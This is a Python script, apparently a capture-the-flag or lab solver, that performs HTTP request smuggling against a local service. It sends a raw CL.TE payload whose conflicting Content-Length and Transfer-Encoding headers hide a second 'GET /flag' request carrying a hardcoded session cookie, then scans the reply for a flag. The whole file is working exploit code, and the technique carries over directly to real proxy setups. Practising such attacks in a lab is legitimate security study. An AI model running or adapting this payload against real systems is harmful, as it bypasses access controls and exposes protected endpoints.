import socket
import time
import re

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 32900
SESSION_COOKIE = "session=58P3X-jvhvlu5K4TJVpzuTVwTbpzpmq1-GjZz0CtaeM"

def send_raw_request(payload, wait_time=1.0):
    """Send raw HTTP request and return response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((TARGET_HOST, TARGET_PORT))
        
        # Send payload
        sock.sendall(payload.encode('utf-8', errors='ignore'))
        
        # Wait a bit for response
        time.sleep(wait_time)
        
        response = b""
        sock.settimeout(1)
        try:
            while True:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        except Exception as e:
            pass
        
        try:
            sock.close()
        except:
            pass
        
        return response.decode('utf-8', errors='replace')
    except Exception as e:
        return f"[Error] {str(e)}"

def search_flag(response):
    """Search for FLAG{} pattern in response"""
    flags = re.findall(r'FLAG\{[^}]+\}', response)
    if flags:
        print(f"\n*** FLAG FOUND: {flags[0]} ***\n")
        return flags[0]
    return None

print("[*] HTTP Request Smuggling Test")
print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}\n")

# Test 1: Basic CL.TE smuggling to /flag
print("[TEST 1] CL.TE Smuggling - GET /flag")
smuggled = "GET /flag HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: " + SESSION_COOKIE + "\r\n\r\n"
payload = (
    "POST / HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    f"Cookie: {SESSION_COOKIE}\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    f"{smuggled}"
)
resp = send_raw_request(payload)
print(f"Response ({len(resp)} bytes):\n{resp}\n")
search_flag(resp)

time.sleep(1)

